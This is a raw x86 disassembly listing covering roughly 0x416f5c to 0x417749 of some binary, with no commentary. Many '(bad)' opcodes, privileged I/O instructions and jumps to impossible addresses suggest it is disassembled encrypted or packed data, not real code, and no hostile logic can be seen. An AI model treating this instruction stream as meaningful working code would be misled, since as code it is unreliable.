  416f5c:	and    BYTE PTR [esi-0x590ecdc4],dh
  416f62:	xor    DWORD PTR [ecx-0x2d5e33ac],0xffffffc6
  416f69:	mov    ebp,0x57d0205
  416f6e:	inc    esi
  416f6f:	xlat   BYTE PTR ds:[ebx]
  416f70:	jp     0x416fdf
  416f72:	mov    ch,0x56
  416f74:	je     0x416fbc
  416f76:	stos   DWORD PTR es:[edi],eax
  416f77:	inc    esi
  416f78:	nop
  416f79:	xchg   ecx,eax
  416f7a:	mov    dh,0x3
  416f7c:	mov    edx,0xe6b38f
  416f81:	add    esp,DWORD PTR fs:[ebx+0x2c]
  416f85:	jecxz  0x416f63
  416f87:	mov    bh,0x20
  416f89:	pop    ecx
  416f8a:	(bad)  
  416f8c:	lea    esp,[ebx]
  416f8e:	lods   al,BYTE PTR ds:[esi]
  416f8f:	mov    al,0x58
  416f91:	(bad)  
  416f92:	iret   
  416f93:	and    edi,edi
  416f95:	lods   al,BYTE PTR ds:[esi]
  416f96:	repz iret 
  416f98:	(bad)  
  416f99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f9a:	ret    0x2d3c
  416f9d:	dec    esp
  416f9e:	neg    DWORD PTR [eax+0x1d65a160]
  416fa4:	cvtps2pi mm6,QWORD PTR [ebx-0x586f54d5]
  416fab:	aas    
  416fac:	fsubr  DWORD PTR [ecx+0x22]
  416faf:	jb     0x416f80
  416fb1:	into   
  416fb2:	and    dl,ah
  416fb4:	test   eax,0x88a43370
  416fb9:	loop   0x416fbd
  416fbb:	ret    0x64d8
  416fbe:	sub    eax,0x5f21e677
  416fc3:	dec    eax
  416fc4:	int    0x0
  416fc6:	cdq    
  416fc7:	shr    ecx,1
  416fc9:	mov    BYTE PTR [edi],al
  416fcb:	cmc    
  416fcc:	shl    bl,0x57
  416fcf:	xor    edi,ebx
  416fd1:	xor    ebp,DWORD PTR [edi]
  416fd3:	xor    bl,BYTE PTR [eax+0x40]
  416fd6:	xor    al,dl
  416fd8:	jno    0x417005
  416fda:	mov    ebp,0xce825c9a
  416fdf:	outs   dx,DWORD PTR ds:[esi]
  416fe0:	fbstp  TBYTE PTR [edx]
  416fe2:	xchg   esp,eax
  416fe3:	lock mov cl,0x17
  416fe6:	push   esp
  416fe7:	sti    
  416fe8:	cmp    BYTE PTR [ebx+0x40],dh
  416feb:	lds    ebx,FWORD PTR [ebp-0x3]
  416fee:	je     0x417040
  416ff0:	loope  0x417002
  416ff2:	arpl   WORD PTR [edx-0x3dfe10ad],cx
  416ff8:	sbb    bl,BYTE PTR ds:[esi+ecx*1]
  416ffc:	xchg   edx,eax
  416ffd:	xor    BYTE PTR [ecx-0x6c],dl
  417000:	cli    
  417001:	jmp    0x623d849
  417006:	imul   eax,DWORD PTR [ebp+0x3e],0x10d38014
  41700d:	in     al,dx
  41700e:	inc    esi
  41700f:	sbb    eax,0x3907cf4b
  417014:	int    0xa5
  417016:	enter  0xe43d,0xfa
  41701a:	sbb    ah,BYTE PTR [ecx+0x75]
  41701d:	jmp    0x40a71d2e
  417022:	sbb    eax,0x8c29016e
  417027:	mov    eax,0xdfe9d35f
  41702c:	dec    esi
  41702d:	scas   al,BYTE PTR es:[edi]
  41702e:	jae    0x416ffb
  417030:	inc    ebp
  417031:	clc    
  417032:	sbb    dl,ah
  417034:	neg    ebx
  417036:	adc    BYTE PTR [ebp-0x676d2ad5],0xa1
  41703d:	int    0x6e
  41703f:	pop    edi
  417040:	jb     0x417090
  417042:	push   edx
  417043:	mov    dh,0xd9
  417045:	mov    dl,0xd8
  417047:	cmp    dl,BYTE PTR [ecx]
  417049:	mov    edi,0x402c869e
  41704e:	sahf   
  41704f:	xchg   edi,eax
  417050:	out    0x87,eax
  417052:	enter  0xde51,0x26
  417056:	fimul  DWORD PTR [esp+eax*1-0x55e356a]
  41705d:	rol    BYTE PTR [ecx-0x18],0x6d
  417061:	cwde   
  417062:	clc    
  417063:	out    0xc2,eax
  417065:	pop    edi
  417066:	ret    
  417067:	std    
  417068:	dec    esi
  417069:	push   0x1858508e
  41706e:	mov    dh,0x6e
  417070:	dec    ecx
  417071:	inc    esi
  417072:	fwait
  417073:	bound  eax,QWORD PTR [ecx+0x5f08ea71]
  417079:	mov    cl,BYTE PTR [edx]
  41707b:	cmp    ch,BYTE PTR [edx+0x62]
  41707e:	icebp  
  41707f:	inc    edx
  417080:	popf   
  417081:	iret   
  417082:	ja     0x417099
  417084:	fsub   DWORD PTR [ebx+0x37202533]
  41708a:	xchg   esi,esi
  41708c:	xchg   edi,eax
  41708d:	pop    esi
  41708e:	in     eax,0xa4
  417090:	mov    ds:0x1e29fc3a,eax
  417095:	inc    edi
  417096:	outs   dx,DWORD PTR ds:[esi]
  417097:	in     eax,dx
  417098:	outs   dx,DWORD PTR ds:[esi]
  417099:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41709a:	jle    0x41702a
  41709c:	in     al,dx
  41709d:	mov    dh,0x8
  41709f:	icebp  
  4170a0:	gs (bad) 
  4170a3:	cld    
  4170a4:	outs   dx,BYTE PTR ds:[esi]
  4170a5:	cmp    al,0x7c
  4170a7:	bnd jle 0x41711a
  4170aa:	loop   0x4170cb
  4170ac:	sub    al,0xa1
  4170ae:	inc    edx
  4170af:	iret   
  4170b0:	push   DWORD PTR [ebp-0x73d57ce1]
  4170b6:	loopne 0x41706a
  4170b8:	xor    ch,BYTE PTR [ecx]
  4170ba:	mov    eax,DWORD PTR [eax+ebp*2]
  4170bd:	inc    ebx
  4170be:	mov    dl,0x71
  4170c0:	xchg   edx,esp
  4170c2:	xor    ecx,ebx
  4170c4:	es leave 
  4170c6:	mov    eax,ds:0xb749d0db
  4170cb:	test   DWORD PTR [edi],eax
  4170cd:	sub    eax,ebp
  4170cf:	jle    0x417074
  4170d1:	int3   
  4170d2:	xchg   edi,eax
  4170d3:	call   0x78c0:0xe990ae62
  4170da:	outs   dx,BYTE PTR ds:[esi]
  4170db:	dec    esi
  4170dc:	dec    esi
  4170dd:	jl     0x417154
  4170df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170e0:	out    dx,eax
  4170e1:	xchg   esp,eax
  4170e2:	and    eax,0xde53dd2a
  4170e7:	in     eax,0x93
  4170e9:	cmp    al,BYTE PTR ds:0x7c202783
  4170ef:	mov    ds:0x75c885ed,eax
  4170f4:	sbb    esp,DWORD PTR [esi]
  4170f6:	and    ebx,edi
  4170f8:	and    BYTE PTR [eax-0x221c64ee],dl
  4170fe:	test   dl,0xb
  417101:	stos   BYTE PTR es:[edi],al
  417102:	sbb    DWORD PTR [esp+ecx*4+0x103f984],eax
  417109:	repz push 0xb7e56763
  41710f:	pop    es
  417110:	jmp    0x4170d3
  417112:	xchg   edi,eax
  417113:	pop    ss
  417114:	mov    cl,0x35
  417116:	shl    BYTE PTR [ebx+0x7ba23789],1
  41711c:	into   
  41711d:	pop    ds
  41711e:	pushf  
  41711f:	repnz pop ebx
  417121:	jle    0x417121
  417123:	jge    0x4170e6
  417125:	inc    ebp
  417126:	ror    esp,cl
  417128:	adc    al,cl
  41712a:	xor    al,0x18
  41712c:	pop    edi
  41712d:	stc    
  41712e:	das    
  41712f:	stos   DWORD PTR es:[edi],eax
  417130:	fst    QWORD PTR [ebx-0x55]
  417133:	outs   dx,DWORD PTR ds:[esi]
  417134:	cli    
  417135:	cmp    DWORD PTR [edx-0x60],ebx
  417138:	pushf  
  417139:	dec    edx
  41713a:	sbb    eax,DWORD PTR [ebp-0x40]
  41713d:	out    dx,al
  41713e:	call   0xd1d2:0xaf757f66
  417145:	test   eax,0x608d7934
  41714a:	outs   dx,BYTE PTR ds:[esi]
  41714b:	cdq    
  41714c:	mov    eax,ds:0x5e8d6f50
  417151:	jbe    0x4171ba
  417153:	mov    WORD PTR [esi],ss
  417155:	outs   dx,BYTE PTR ds:[esi]
  417156:	mov    esp,0x1e73820a
  41715b:	shl    DWORD PTR [edx-0x53],1
  41715e:	mov    ds:0xac71d97,al
  417163:	addr16 push es
  417165:	and    edx,DWORD PTR [esi+0x342481c4]
  41716b:	dec    ecx
  41716c:	mov    ch,BYTE PTR [edi-0x15]
  41716f:	sbb    edx,DWORD PTR [edx+edi*2]
  417172:	xor    bh,0x1d
  417175:	ds mov esi,0x469869f3
  41717b:	lods   eax,DWORD PTR ds:[esi]
  41717c:	push   es
  41717d:	shl    dl,cl
  41717f:	dec    edi
  417180:	ficom  DWORD PTR [edx+0x5ac6127f]
  417186:	repnz shr esi,0x9b
  41718a:	inc    edx
  41718b:	int    0x6f
  41718d:	add    eax,0x8d354b4f
  417192:	cmp    DWORD PTR [ebx+0x100375d],eax
  417198:	adc    DWORD PTR [edi-0xc47b879],ebx
  41719e:	push   eax
  41719f:	or     eax,0xee19dfbd
  4171a4:	repnz mov ds:0x37afc7ac,eax
  4171aa:	mov    BYTE PTR [edx+ebx*2-0x69b03e6],dl
  4171b1:	lods   eax,DWORD PTR ds:[esi]
  4171b2:	in     eax,0x74
  4171b4:	test   ebx,edi
  4171b6:	adc    eax,0x6df5c3f9
  4171bb:	inc    edx
  4171bc:	(bad)  
  4171bd:	push   esi
  4171be:	ins    DWORD PTR es:[edi],dx
  4171bf:	cli    
  4171c0:	scas   al,BYTE PTR es:[edi]
  4171c1:	cdq    
  4171c2:	retf   
  4171c3:	push   ds
  4171c4:	or     DWORD PTR ds:0x6455ceaf,esp
  4171ca:	inc    eax
  4171cb:	out    0x2a,eax
  4171cd:	cs push eax
  4171cf:	je     0x417162
  4171d1:	adc    al,0x95
  4171d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171d4:	xchg   ebx,eax
  4171d5:	pop    ecx
  4171d6:	daa    
  4171d7:	add    DWORD PTR [esi+esi*4-0xf0bc57d],ebp
  4171de:	sub    al,0x2e
  4171e0:	fbstp  TBYTE PTR [edx+0x44e98966]
  4171e6:	jge    0x41720d
  4171e8:	fmul   DWORD PTR [eax]
  4171ea:	mov    bl,0xd3
  4171ec:	sub    BYTE PTR [edx],bh
  4171ee:	push   edi
  4171ef:	aam    0xf5
  4171f1:	scas   al,BYTE PTR es:[edi]
  4171f2:	adc    ah,BYTE PTR [esp+ebx*2-0x3]
  4171f6:	inc    edx
  4171f7:	(bad)  
  4171f8:	fcmovbe st,st(4)
  4171fa:	add    BYTE PTR [esi],bh
  4171fc:	mov    WORD PTR [ecx-0x4ac2780c],ds
  417202:	mov    bh,0x1e
  417204:	add    eax,0x2066f1dc
  417209:	mov    cl,0xce
  41720b:	jge    0x4171f1
  41720d:	mov    ecx,0xa2a3b76e
  417212:	push   ss
  417213:	cld    
  417214:	mov    cl,0x7e
  417216:	lea    eax,[eax]
  417218:	ror    edi,0x57
  41721b:	jge    0x4171f4
  41721d:	push   0x46ba35e1
  417222:	xor    ch,cl
  417224:	fbld   TBYTE PTR ds:0xe1485008
  41722a:	and    eax,0x2820188e
  41722f:	push   edi
  417230:	imul   ecx,DWORD PTR [ebx+ebp*8+0x33],0xffffffc6
  417235:	and    esi,ebx
  417237:	push   ebx
  417238:	mov    edi,ds
  41723a:	das    
  41723b:	out    0xa3,eax
  41723d:	mov    dh,0x6d
  41723f:	or     BYTE PTR [esi],0x37
  417242:	outs   dx,DWORD PTR ds:[esi]
  417243:	sub    ebp,DWORD PTR [eax+0x374b1bb6]
  417249:	ret    
  41724a:	sahf   
  41724b:	add    esi,DWORD PTR [eax+eax*2-0x20]
  41724f:	or     cl,ah
  417251:	sbb    esi,ebp
  417253:	(bad)  
  417254:	repz mov esi,0xf1c1cb32
  41725a:	mov    eax,0xad8af71d
  41725f:	xchg   DWORD PTR [esi+0x75],eax
  417262:	or     dh,BYTE PTR [edx-0x44]
  417265:	mov    ds:0xa19cb416,eax
  41726a:	xor    al,bh
  41726c:	inc    ebx
  41726d:	adc    BYTE PTR [edi+0x12ab54d8],0xe8
  417274:	sub    ebp,eax
  417276:	inc    edi
  417277:	add    al,0xb1
  417279:	or     eax,0x76442193
  41727e:	cs sbb eax,0x3c3ca612
  417284:	lock sbb BYTE PTR [ebp+0x672daa1b],al
  41728b:	neg    BYTE PTR [esi+0x2f]
  41728e:	add    edi,DWORD PTR [edi]
  417290:	aam    0x82
  417292:	push   edx
  417293:	(bad)  
  417294:	cmp    ch,BYTE PTR [esi+0x2e]
  417297:	pop    edx
  417298:	jp     0x417296
  41729a:	mov    edi,0x8c08d95a
  41729f:	adc    eax,0xc1ecf700
  4172a4:	mov    al,0x38
  4172a6:	std    
  4172a7:	xchg   ebp,eax
  4172a8:	pop    esp
  4172a9:	cmp    al,0xa
  4172ab:	out    dx,eax
  4172ac:	sbb    esi,ebx
  4172ae:	js     0x41729d
  4172b0:	enter  0x2090,0xa1
  4172b4:	imul   edi,DWORD PTR [ebp-0x9d19f84],0xa2b838eb
  4172be:	std    
  4172bf:	jno    0x4172be
  4172c1:	push   esp
  4172c2:	call   0x7d894509
  4172c7:	pop    es
  4172c8:	dec    edx
  4172c9:	cmp    esi,DWORD PTR [esi+0x256073d8]
  4172cf:	stc    
  4172d0:	mov    ecx,0xb590b7f7
  4172d5:	cmp    DWORD PTR [edi-0x47],eax
  4172d8:	lea    edx,[edi+0x57]
  4172db:	jp     0x4172c8
  4172dd:	dec    esp
  4172de:	jae    0x417295
  4172e0:	ss je  0x41726e
  4172e3:	out    0xf8,eax
  4172e5:	loope  0x4172aa
  4172e7:	pushf  
  4172e8:	cmp    bh,BYTE PTR [ebx+0x46]
  4172eb:	sbb    DWORD PTR [ecx+0x71],ecx
  4172ee:	lock imul esi,DWORD PTR [ebx-0x21],0x829ede2b
  4172f6:	idiv   DWORD PTR [ecx-0x12]
  4172f9:	xchg   esi,eax
  4172fa:	int3   
  4172fb:	sbb    eax,DWORD PTR [ebx-0xbfbc201]
  417301:	inc    eax
  417302:	cmp    eax,0xac586c5d
  417307:	lds    esi,FWORD PTR [edx-0x26]
  41730a:	or     al,0x18
  41730c:	push   eax
  41730d:	mov    eax,ds:0xd1e52c5b
  417312:	cmp    eax,0xaaad44db
  417317:	imul   edx,DWORD PTR [ebx+0x27],0xffffffcf
  41731b:	lahf   
  41731c:	mov    al,0x85
  41731e:	dec    ebp
  41731f:	out    0xbe,al
  417321:	push   esp
  417322:	sub    DWORD PTR [eax-0x7a],esi
  417325:	cmc    
  417326:	sbb    al,0x78
  417328:	sbb    al,0x32
  41732a:	cmp    al,0x2f
  41732c:	shl    BYTE PTR [esi+0x623579de],1
  417332:	inc    edx
  417333:	xor    al,0xf5
  417335:	pop    ebx
  417336:	aam    0xe1
  417338:	jecxz  0x417388
  41733a:	and    esp,edi
  41733c:	or     ch,BYTE PTR [eax+0x74]
  41733f:	neg    dl
  417341:	call   0x22cd668d
  417346:	pusha  
  417347:	adc    esi,eax
  417349:	dec    ecx
  41734a:	lea    ebp,[edx+0x7d]
  41734d:	je     0x417324
  41734f:	test   DWORD PTR [ebp-0x6],edx
  417352:	jmp    0x417366
  417354:	mov    edi,?
  417356:	push   0x0
  417358:	int    0xff
  41735a:	cli    
  41735b:	jge    0x417328
  41735d:	jmp    0x3dc86e32
  417362:	pusha  
  417363:	js     0x417394
  417365:	sub    dl,bl
  417367:	xchg   edx,eax
  417368:	loop   0x4173c9
  41736a:	retf   
  41736b:	pop    ds
  41736c:	sbb    ebp,DWORD PTR [ebp+0x72ad80ad]
  417372:	adc    cl,bl
  417374:	xor    DWORD PTR [ecx+0x1e88948a],esi
  41737a:	inc    ebp
  41737b:	test   eax,0xef3ab6ab
  417380:	push   ds
  417381:	xor    al,0xc
  417383:	jbe    0x417389
  417385:	push   es
  417386:	fnstcw WORD PTR [edx]
  417388:	stos   BYTE PTR es:[edi],al
  417389:	mov    eax,ds:0x96201366
  41738e:	clc    
  41738f:	inc    edi
  417390:	stos   DWORD PTR es:[edi],eax
  417391:	mov    eax,ds:0xee18e0bc
  417396:	fs cmp al,0xf8
  417399:	fs addr16 jmp 0xbf6b:0x9cea
  4173a1:	sbb    eax,0x64ce20ab
  4173a6:	mov    edx,esp
  4173a8:	inc    ebp
  4173a9:	mov    WORD PTR [esi+0x4c626ff1],fs
  4173af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173b0:	lock retf 
  4173b2:	pop    es
  4173b3:	xchg   ebx,eax
  4173b4:	sbb    al,dh
  4173b6:	mov    ebx,0x3caa9e59
  4173bb:	sar    BYTE PTR [edi-0x49],cl
  4173be:	jne    0x417378
  4173c0:	jg     0x417362
  4173c2:	sub    DWORD PTR [ebp-0x2d],ecx
  4173c5:	cmp    dh,dh
  4173c7:	call   0xda08:0xf881ba4a
  4173ce:	cmp    DWORD PTR [ecx],esp
  4173d0:	adc    ah,BYTE PTR [edi]
  4173d2:	dec    ecx
  4173d3:	or     dl,ch
  4173d5:	jge    0x778006a7
  4173db:	mov    ebx,0xfb118aea
  4173e0:	out    dx,eax
  4173e1:	pop    edx
  4173e2:	or     esp,DWORD PTR [edi+0x6f4591c]
  4173e8:	dec    ebx
  4173e9:	jecxz  0x417384
  4173eb:	fiadd  DWORD PTR [esi+0x701ee47e]
  4173f1:	(bad)  
  4173f2:	or     eax,0xd95ddbeb
  4173f7:	push   0x7a5c8f96
  4173fc:	inc    esi
  4173fd:	shl    DWORD PTR [ecx],cl
  4173ff:	xchg   ebx,eax
  417400:	sbb    al,bh
  417402:	pop    DWORD PTR [ecx]
  417404:	sub    BYTE PTR [esi+0x3b],0x38
  417408:	outs   dx,BYTE PTR ds:[esi]
  417409:	stos   DWORD PTR es:[edi],eax
  41740a:	or     DWORD PTR [esi+0x32b12c2b],eax
  417410:	ds sub eax,0xa59ffba2
  417416:	(bad)  
  417417:	sub    edi,eax
  417419:	lea    ecx,[ebp+eiz*4+0x41]
  41741d:	test   BYTE PTR [esi-0x32b7f1f0],ah
  417423:	or     BYTE PTR [ebp-0x4d],0x66
  417427:	push   esi
  417428:	xor    BYTE PTR [ecx],0x9c
  41742b:	xchg   ebx,eax
  41742d:	mov    edi,0xc23f0b51
  417432:	sub    BYTE PTR [ebx+0x4],dl
  417435:	(bad)  
  417437:	int    0x1b
  417439:	fcmovnbe st,st(0)
  41743b:	mov    ds:0xb4eada5f,al
  417440:	sahf   
  417441:	ss or  cl,0xce
  417445:	cli    
  417446:	outs   dx,BYTE PTR ds:[esi]
  417447:	dec    ebx
  417448:	xchg   edi,eax
  417449:	adc    edi,esi
  41744b:	inc    BYTE PTR [ebx-0x56]
  41744e:	mov    cl,0x7f
  417450:	xchg   ebp,eax
  417451:	or     eax,0x47ab2320
  417456:	mov    ds:0xb078458b,al
  41745b:	cli    
  41745c:	out    dx,al
  41745d:	and    ch,BYTE PTR [ebx+0x4a]
  417460:	xchg   edx,eax
  417461:	xor    ecx,DWORD PTR [ebp+0x41ab179a]
  417467:	gs adc eax,0xa9f9db6d
  41746d:	out    dx,eax
  41746e:	ret    0x6320
  417471:	jne    0x4174cc
  417473:	(bad)  
  417474:	(bad)  
  417475:	scas   eax,DWORD PTR es:[edi]
  417476:	xchg   ebp,eax
  417477:	push   0x57
  417479:	cmp    eax,0x23b92749
  41747e:	scas   eax,DWORD PTR es:[edi]
  41747f:	sub    al,0xe2
  417481:	rcl    DWORD PTR ds:0xfdc61c4f,cl
  417487:	paddw  mm4,QWORD PTR [edi-0x6742bcb2]
  41748e:	sub    eax,0x7e8019a6
  417493:	jp     0x417479
  417495:	rol    BYTE PTR [edi],1
  417497:	xchg   edx,eax
  417498:	xchg   ebx,eax
  417499:	sbb    DWORD PTR [esi-0x28166bff],edi
  41749f:	cmp    ecx,DWORD PTR [ebp+0x75]
  4174a2:	or     ah,BYTE PTR [ecx-0x53]
  4174a5:	sub    ch,BYTE PTR [edx]
  4174a7:	mov    esi,0x63a3ec15
  4174ac:	mov    ebx,0xf29b85c7
  4174b1:	push   es
  4174b2:	push   ebx
  4174b3:	or     ebx,eax
  4174b5:	shl    BYTE PTR [ebp+edx*1+0x27],cl
  4174b9:	(bad)  
  4174ba:	std    
  4174bb:	fist   WORD PTR [eax+0xd]
  4174be:	xor    ecx,DWORD PTR [eax]
  4174c0:	dec    ebp
  4174c1:	shr    edx,cl
  4174c3:	pop    ds
  4174c4:	div    DWORD PTR [eax+esi*8]
  4174c7:	arpl   dx,sp
  4174c9:	xchg   esp,eax
  4174ca:	sbb    eax,0xd2ae81a7
  4174cf:	sbb    dl,ch
  4174d1:	or     bh,BYTE PTR [ecx+0x4a]
  4174d4:	fimul  WORD PTR ds:0xd4d1b7b5
  4174da:	mov    dh,0xd5
  4174dc:	pop    ds
  4174dd:	mov    ch,0xe9
  4174df:	xlat   BYTE PTR ds:[ebx]
  4174e0:	add    BYTE PTR [eax+0x31],0xe9
  4174e4:	es jno 0x41752d
  4174e7:	iret   
  4174e8:	pop    DWORD PTR [ebp-0x8]
  4174eb:	dec    ecx
  4174ec:	ds js  0x41752b
  4174ef:	mov    ah,0xb
  4174f1:	push   esi
  4174f2:	imul   edi,DWORD PTR [esi+0x5d202c4d],0x38
  4174f9:	loop   0x4174cc
  4174fb:	fist   WORD PTR [ebx-0x43]
  4174fe:	push   eax
  4174ff:	jo     0x41755e
  417501:	stc    
  417502:	inc    eax
  417503:	inc    ebx
  417504:	mov    edi,DWORD PTR [eax+0x360df4f1]
  41750a:	je     0x417490
  41750c:	mov    ecx,0x78ca5bcf
  417511:	cmp    al,0x95
  417513:	pop    ds
  417514:	pop    edx
  417515:	int    0x9
  417517:	mov    bl,0x6
  417519:	xchg   BYTE PTR [edi-0x1e61964],bh
  41751f:	mov    esi,0x97bc4935
  417524:	mov    ecx,0xe092eb72
  417529:	fst    DWORD PTR [edi+0x18]
  41752c:	mov    dl,0x44
  41752e:	add    eax,0x1781ae4c
  417533:	imul   edi,DWORD PTR [edx+0x59936e9f],0xc1f725bb
  41753d:	sub    bl,BYTE PTR [edx]
  41753f:	(bad)  
  417540:	int3   
  417541:	into   
  417542:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417543:	or     al,0xdb
  417545:	cmp    eax,0x2240d60a
  41754a:	js     0x417544
  41754c:	ror    DWORD PTR [ebp-0x322bd570],0x51
  417553:	mov    bl,al
  417555:	push   ds
  417556:	xor    ch,al
  417558:	dec    eax
  417559:	loopne 0x41753c
  41755b:	adc    eax,0x1a74b796
  417560:	lods   eax,DWORD PTR ds:[esi]
  417561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417562:	dec    ebx
  417563:	mov    ch,0xcd
  417565:	sbb    eax,0x9fa3c24f
  41756a:	and    DWORD PTR [eax+0x20],ebp
  41756d:	daa    
  41756e:	push   0xe993ac3d
  417573:	cld    
  417574:	xchg   ecx,eax
  417575:	or     eax,0x72e64195
  41757a:	cmp    eax,0x8ddf2299
  41757f:	lods   eax,DWORD PTR ds:[esi]
  417580:	cmp    ebp,esp
  417582:	cwde   
  417583:	and    DWORD PTR [esi-0x61],esi
  417586:	jne    0x41752c
  417588:	push   esi
  417589:	dec    eax
  41758a:	pusha  
  41758b:	push   edx
  41758c:	mov    esi,0xb8ffab45
  417591:	arpl   WORD PTR [eax+0x2c],dx
  417594:	xchg   ecx,edi
  417596:	fimul  WORD PTR [ecx-0x1ce3017]
  41759c:	push   ss
  41759d:	xchg   ebx,eax
  41759e:	stc    
  41759f:	shl    BYTE PTR [esi-0xdc34aec],cl
  4175a5:	jmp    0x4f5c3fa8
  4175aa:	xchg   esi,eax
  4175ab:	jno    0x417535
  4175ad:	push   ebp
  4175ae:	sub    DWORD PTR [edx],eax
  4175b0:	cmp    eax,DWORD PTR [esi+ebp*4+0xf]
  4175b4:	sub    BYTE PTR [ecx-0x6cbe102b],0xc3
  4175bb:	cmp    BYTE PTR ds:0xd86c3369,ah
  4175c1:	push   ss
  4175c2:	(bad)  [ecx-0x24]
  4175c5:	dec    ebx
  4175c6:	dec    ebp
  4175c7:	stos   DWORD PTR es:[edi],eax
  4175c8:	mov    ds:0x1c5392be,al
  4175cd:	(bad)  
  4175ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175cf:	sbb    DWORD PTR [esi+0x3b],ebp
  4175d2:	out    0xd6,eax
  4175d4:	cdq    
  4175d5:	jnp    0x417633
  4175d7:	jb     0x4175b1
  4175d9:	push   es
  4175da:	xor    DWORD PTR [edi],edi
  4175dc:	adc    eax,0xd84f2d1b
  4175e1:	mov    eax,0x6c42b99c
  4175e6:	xor    al,0x3
  4175e8:	push   cs
  4175e9:	adc    BYTE PTR [ebx-0x71],bh
  4175ec:	out    dx,eax
  4175ed:	scas   eax,DWORD PTR es:[edi]
  4175ee:	add    eax,0x9a821315
  4175f3:	and    esp,DWORD PTR [ebx+esi*2+0x5adfe0d4]
  4175fa:	imul   DWORD PTR [eax+edi*8+0x3e]
  4175fe:	lds    ecx,FWORD PTR [esp+edx*8-0x6c]
  417602:	inc    ebp
  417603:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417604:	pusha  
  417605:	loope  0x417664
  417607:	xchg   ecx,eax
  417608:	sbb    esi,DWORD PTR [ebp+0x606420a9]
  41760e:	pop    ss
  41760f:	or     esp,DWORD PTR [eax+esi*1]
  417612:	jmp    FWORD PTR [esi+0x51]
  417615:	inc    edx
  417616:	repz mov esp,0x5e24c2a
  41761c:	ror    BYTE PTR ds:0xe5b2a7b0,cl
  417622:	icebp  
  417623:	push   eax
  417624:	push   ds
  417625:	(bad)  
  417626:	adc    eax,0x73683f8e
  41762b:	repz neg BYTE PTR [edx*1-0x5cb22a55]
  417633:	into   
  417634:	and    cl,dh
  417636:	loopne 0x41765c
  417638:	out    dx,al
  417639:	push   esp
  41763a:	out    dx,eax
  41763b:	pop    ebx
  41763c:	rcr    dh,1
  41763e:	shr    DWORD PTR [edi+0x25],0x79
  417642:	or     ebx,edx
  417644:	int3   
  417645:	dec    esp
  417646:	push   esp
  417647:	cmp    BYTE PTR [edi+0x5d],bh
  41764a:	cld    
  41764b:	dec    edx
  41764c:	repz call DWORD PTR [eax]
  41764f:	inc    ecx
  417650:	jmp    0xf7ce:0x8169f8a7
  417657:	jecxz  0x417636
  417659:	fsubp  st(1),st
  41765b:	and    eax,0x68d49ad9
  417660:	loop   0x4175e7
  417662:	cmp    al,0x3
  417664:	adc    al,0x40
  417666:	xchg   BYTE PTR [edi],bh
  417668:	dec    esi
  417669:	rcr    DWORD PTR [ecx],cl
  41766b:	sbb    eax,0x42a7dfec
  417670:	pop    ebx
  417671:	arpl   cx,ax
  417673:	das    
  417674:	push   ecx
  417675:	sbb    DWORD PTR [ebp-0x584994e7],esp
  41767b:	push   0x59d7d6b4
  417680:	mov    al,0x1a
  417682:	fst    st(2)
  417684:	mov    ebx,0xb2bd077a
  417689:	pop    esi
  41768a:	pop    ebx
  41768b:	jmp    0x41763e
  41768d:	int    0x9c
  41768f:	shl    DWORD PTR [ecx],cl
  417691:	rol    DWORD PTR [eax+0x3bb67de8],1
  417697:	inc    ebp
  417698:	outs   dx,DWORD PTR ds:[esi]
  417699:	push   0x9c6d3db0
  41769e:	pop    eax
  41769f:	or     al,0x7d
  4176a1:	inc    ecx
  4176a2:	(bad)  
  4176a3:	fs pmulhuw mm4,mm2
  4176a7:	das    
  4176a8:	pushf  
  4176a9:	dec    ebx
  4176aa:	nop
  4176ab:	jg     0x41771a
  4176ad:	into   
  4176ae:	sbb    BYTE PTR [ebp+0x2c],ah
  4176b1:	jge    0x417634
  4176b3:	lahf   
  4176b4:	ins    BYTE PTR es:[edi],dx
  4176b5:	and    al,0x49
  4176b7:	in     eax,dx
  4176b8:	add    BYTE PTR [edi-0x6f23214e],ah
  4176be:	mov    ecx,0xa264f081
  4176c3:	add    esi,esp
  4176c5:	jo     0x417659
  4176c7:	cmp    cl,BYTE PTR ds:0x2185870
  4176cd:	pop    es
  4176ce:	xchg   esp,eax
  4176cf:	mov    bl,0x73
  4176d1:	std    
  4176d2:	xor    DWORD PTR [ecx+0x78],esi
  4176d5:	icebp  
  4176d6:	pop    ds
  4176d7:	xor    al,0x97
  4176d9:	add    eax,esi
  4176db:	fs jmp 0x41772c
  4176de:	loop   0x41775d
  4176e0:	mov    bh,0x14
  4176e2:	push   0xffffffb6
  4176e4:	retf   
  4176e5:	add    ecx,edi
  4176e7:	jg     0x4176ce
  4176e9:	ret    0x9c0d
  4176ec:	add    ebx,0x6d
  4176ef:	jns    0x4176ed
  4176f1:	inc    eax
  4176f2:	or     ebp,DWORD PTR [ebx-0x5c]
  4176f5:	xlat   BYTE PTR ds:[ebx]
  4176f6:	bswap  ecx
  4176f8:	in     al,0xe2
  4176fa:	push   esp
  4176fb:	rcr    BYTE PTR [ecx+0xf3afe40],1
  417701:	dec    edi
  417702:	xor    ch,BYTE PTR [esi]
  417704:	lahf   
  417705:	xlat   BYTE PTR ds:[ebx]
  417706:	loopne 0x417777
  417708:	lods   eax,DWORD PTR ds:[esi]
  417709:	call   0x818d:0x9be0c4ca
  417710:	rol    BYTE PTR [edx],0x81
  417713:	hlt    
  417714:	(bad)  
  417715:	icebp  
  417716:	loope  0x417790
  417718:	pop    es
  417719:	sub    BYTE PTR [ecx],cl
  41771b:	mov    esi,0xc5654071
  417720:	sti    
  417721:	pop    edi
  417722:	icebp  
  417723:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417724:	ffreep st(4)
  417726:	cmp    eax,0xfa4fe989
  41772b:	test   DWORD PTR [edi-0x666f986b],ebp
  417731:	into   
  417732:	mov    BYTE PTR [esi-0x14],dl
  417735:	test   eax,0xcb53633
  41773a:	push   ss
  41773b:	jle    0x4176f5
  41773d:	sti    
  41773e:	jo     0x417744
  417740:	fimul  WORD PTR [edx-0x65c0b0e1]
  417746:	inc    ecx
  417747:	mov    dh,bh
  417749:	stc    
